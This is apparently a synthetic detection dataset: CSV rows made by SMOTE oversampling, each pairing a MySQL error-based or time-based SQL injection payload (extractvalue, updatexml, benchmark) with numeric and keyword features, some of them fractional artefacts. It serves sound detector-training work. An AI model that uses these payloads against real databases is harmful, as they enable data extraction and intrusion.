id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000140,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000297,0.12345594340480336,164.05679436413692,35.943205635863094,3.976954314386988,55.0,31.0,60.0,18.056794364136906,0.33525041795907135,0.188959326486022,0.36572772868262327,0.11006252687228338,0.05679436413690642,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.0,1.0,0.05679436413690647,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000141,attack,error,"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd",nearest_attack_euclidean,R000230,0.6323782786786316,195.7516728438921,30.7516728438921,3.5999984854951057,51.7516728438921,35.0,83.0,26.0,0.26437050992989175,0.1787988343920402,0.42400866441540963,0.13282199126265845,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.7516728438920997,0.24832715610790035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",nearest_attack_euclidean,R000146,0.6512383123557762,191.9143462906872,29.43897205285222,3.5589700974202363,49.87794410570444,35.0,81.31691615855667,25.71948602642611,0.2598262943084537,0.18249715384130288,0.4236317700332082,0.13404478181703522,0.0,4.000000000000001,0.0,0.0,0.0,1.2805139735738904,0.0,15.438972052852218,0.0,0.0,5.0,1.2805139735738904,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000134,0.4701400582398561,167.65862302604907,30.036639391280673,3.7586939106569135,42.24396726953681,43.0,61.41465575651227,21.0,0.2517828217239682,0.25656693013017207,0.3663501194776362,0.12530012866822354,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000144,attack,error,"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000152,0.00014399041331126074,181.99943018056956,33.999837194448446,3.853640703742566,45.00024420832734,46.999674388896885,66.99967438889688,22.999837194448443,0.2472549478113013,0.25824073847072104,0.36813120617522993,0.12637310754274778,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.999918597224221,0.0,0.0,5.999918597224221,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000237,0.18265065060708163,168.09006799660006,27.0,3.633334660430403,40.0,43.0,65.93434399708576,19.155723999514294,0.23807844907321263,0.25593433275370353,0.39203960127483106,0.11394761689825275,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.155723999514294,0.0,0.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000146,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R000295,0.11783678273438226,160.60273525356942,29.939726474643056,3.849787346254318,47.0,35.0,57.48218820285554,21.120547050713885,0.29270850893684697,0.2179744215487158,0.3578233162868908,0.13149375322754647,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.120547050713887,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000147,attack,error,"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000217,0.41727324600971044,175.7897212068888,34.0,3.8908893990042657,46.23297662561909,44.02269783250789,64.02269783250789,21.511348916253944,0.2632063579136962,0.2503331241176146,0.36413910544301703,0.12232141252567223,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.255674458126972,0.0,0.0,5.255674458126971,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",nearest_attack_euclidean,R000037,0.7654324037147472,195.84278847566807,31.415721152433193,3.621987047884083,64.0,24.0,82.67423078053446,25.168557695133615,0.32700161940940115,0.12262560727852542,0.4219043775578799,0.1284683957541935,0.0,4.000000000000001,0.0,0.0,0.0,0.0,0.0,17.168557695133615,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000102,1.0669942082851396,166.8461272357413,29.53146611234012,3.8332711541091733,50.12586444936047,35.0,60.18879667404071,21.53146611234012,0.30036292319194907,0.21000236699223798,0.36054337036267875,0.12909133945313417,0.0,4.000000000000001,0.0,0.0,0.0,1.468533887659882,0.0,11.062932224680235,0.0,0.0,5.0,1.468533887659882,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000150,attack,error,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000112,0.44801637689955515,184.67963301901864,31.339816509509316,3.8640035319545643,50.98055047147205,44.35926603803727,66.0,23.33981650950932,0.27609514871908275,0.2401496239826162,0.3573849994373764,0.12637022786092467,2.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.339816509509317,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000151,attack,error,"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000168,0.07718024420239106,195.87308299927616,30.06345850036192,3.5549911469837414,48.0,40.0,82.87308299927616,25.0,0.24505984311316814,0.20421653592764014,0.4230882860044166,0.12763533495477508,0.03172925018096029,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,14.96827074981904,0.0,0.0,4.0,5.0,0.0317292501809604,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000152,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000086,0.08533020808024791,144.97115274643267,29.971152746432654,3.7934578181183296,40.884610985730625,35.115389014269375,51.94230549286531,17.028847253567346,0.28201395260187745,0.24222897801455542,0.35829187517485495,0.11746519420871215,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.028847253567345,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9711527464326555,0.028847253567344466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000153,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,0.5560632568627376,167.6527827020627,27.782405765979103,3.4532156705043926,41.435188468041794,32.0,71.4351884680418,22.782405765979103,0.24712618469103237,0.19088097758133124,0.4260771011735304,0.13591573655410596,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.782405765979102,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.21759423402089753,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.217594234020898
SMOTE_000154,attack,error,"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000098,1.5308016955915071,183.05739983952807,27.45976362177528,3.473474470523573,37.839054487101116,37.160945512898884,79.5976362177528,28.45976362177528,0.2065657601950237,0.2035078089160694,0.4343996866653407,0.1555267442235662,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,14.919527243550558,1.9999999999999998,0.0,5.540236378224721,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.4597636217752792,0.5402363782247208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000155,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",nearest_attack_euclidean,R000257,0.9819866434031479,174.1866805787253,29.093340289362644,3.537134791996982,46.79112038581686,32.0,73.69778009645421,21.697780096454217,0.26852528476353454,0.18375756087836867,0.42316159539272297,0.12455555896537385,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.6977800964542151,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000156,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000212,0.3509869541437656,170.0,28.759201132421722,3.731798365250252,46.27760339726517,35.96319547031311,64.51840226484344,23.240798867578278,0.272221196454501,0.21154820864890064,0.3795200133226085,0.13671058157398985,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.2407988675782775,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000157,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000194,0.4754397525204507,149.13159388643166,33.19674256602055,3.886047690337309,52.55765335826722,23.0,55.37719796214388,18.196742566020554,0.3516526814552208,0.1546727603079382,0.37144111485847753,0.12223344337836355,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,12.196742566020555,0.0,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",nearest_attack_euclidean,R000136,0.7883029213506363,199.8006649375564,30.398670124887204,3.550476312205607,63.202659750225585,24.0,86.3986701248872,26.199335062443602,0.31631380387038965,0.12012020204770468,0.43243409146601985,0.13113190261588578,4.0,1.1102230246251565e-16,0.0,0.0,0.0,0.19933506244360277,0.0,18.0,0.0,0.0,4.0,0.19933506244360277,1.0,0.0,0.0,0.0,0.0,0.19933506244360277,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000159,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000205,0.742889109128917,164.88912188863054,27.296373962876842,3.4368733719512465,41.0,31.296373962876842,71.0,21.592747925753685,0.24866897920863693,0.1897927030584291,0.43062189082471275,0.13091642690822125,0.2963739628768427,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.296373962876843,2.0,0.29637396287684276,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000160,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",nearest_attack_euclidean,R000177,0.12904045897309596,161.0,29.085258401899512,3.892968907176612,50.74422479430146,35.34103360759805,54.829483196200975,20.085258401899512,0.3151815204614997,0.21950952551303138,0.34055579624969545,0.12475315777577337,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.085258401899512,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000161,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",nearest_attack_euclidean,R000158,0.7636684088949764,172.5491743274589,30.54576452728824,3.8390774372302947,64.0,24.0,63.45764527288242,21.091529054576483,0.3722527851313453,0.1395947944242545,0.36607853532992596,0.12207388511447426,0.0,4.000000000000001,0.0,0.0,0.0,0.0,0.0,13.091529054576483,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,error,"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",nearest_attack_euclidean,R000032,0.42637429724400994,178.57545943886677,27.0,3.5760165277076488,37.51954440595712,46.30727412539051,73.26818531347627,21.48045559404288,0.2104987441108998,0.25929037030035873,0.4100103246707975,0.12020056091794395,0.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,13.653637062695253,0.0,0.0,5.826818531347627,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000163,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000297,0.10056490729304277,164.0462636290054,35.953736370994584,3.976926393685049,55.0,31.0,60.0,18.046263629005416,0.33527182189226545,0.18897139052109505,0.3657510784279259,0.11000570915871363,0.04626362900541503,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.0,1.0,0.04626362900541514,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R000295,0.3296233662965143,161.68602382598078,29.831397617401922,3.835690229077447,47.0,35.0,58.34881906078463,21.33720476519616,0.2908366500065773,0.2165804840474512,0.3606510180751704,0.13193184787080106,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.337204765196157,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000165,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000122,1.2298401953501314,196.2983836828819,32.23387210570603,3.9164240962969554,60.16936052853015,40.427406837233676,68.7016163171181,27.0,0.3066031552365484,0.20580272773486605,0.3500426062074492,0.13755151082113634,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.7661278942939702,0.0,12.46774421141206,0.0,0.0,4.76612789429397,5.76612789429397,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.7661278942939704,0.0,1.0,0.7661278942939701,0.0,0.7661278942939702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2338721057060298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.532255788587941
SMOTE_000166,attack,error,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",nearest_attack_euclidean,R000051,1.1081849105911252,160.09218217461617,27.509218217461616,3.7167028201816907,38.527654652384854,36.96312713015354,60.09218217461616,24.509218217461616,0.24060120158978898,0.23150301467698015,0.37474949041883154,0.15314629331439933,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.018436434923233,1.9999999999999998,0.0,5.490781782538384,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000167,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000103,0.2079380597542894,175.43897143399957,36.0,3.9553815749803447,59.829228575499684,31.0,65.6097428584999,19.0,0.34088844985088324,0.1767589972769703,0.37401639325077757,0.1083361596213689,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
